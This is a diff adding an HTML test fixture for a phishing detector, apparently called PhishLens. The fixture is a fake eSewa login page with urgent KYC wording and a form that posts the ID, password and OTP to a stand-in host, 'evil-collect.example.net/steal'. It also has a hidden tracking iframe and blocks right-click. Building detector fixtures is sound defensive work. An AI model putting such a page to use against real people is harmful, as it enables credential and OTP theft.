@@ -1,0 +1,28 @@
+<!doctype html>
+<!--
+  TEST FIXTURE — NOT A REAL LOGIN PAGE.
+  Local test file only. Never host this publicly: a look-alike login page,
+  even labelled as a demo, can be mistaken for a real phishing page and may
+  get your domain or repo flagged.
+
+  Purpose: exercise PhishLens against a fake eSewa login (brand in subdomain
+  + password + OTP + urgency language + cross-domain form action).
+  Open it from disk (file://) or serve the tests/fixtures folder locally.
+-->
+<html lang="en">
+<head><meta charset="UTF-8"><title>eSewa Login — Verify Your Account</title></head>
+<body>
+  <h1>eSewa Login</h1>
+  <p>Your account will be blocked within 24 hours. Update KYC now to continue using eSewa.</p>
+  <form action="https://evil-collect.example.net/steal" method="post">
+    <label>eSewa ID <input type="text" name="id"></label>
+    <label>Password <input type="password" name="password"></label>
+    <label>OTP <input type="text" name="otp" autocomplete="one-time-code"></label>
+    <button type="submit">Login</button>
+  </form>
+  <iframe src="https://evil-collect.example.net/pixel" width="1" height="1" style="display:none"></iframe>
+  <script>
+    document.oncontextmenu = function () { return false; };
+  </script>
+</body>
+</html>
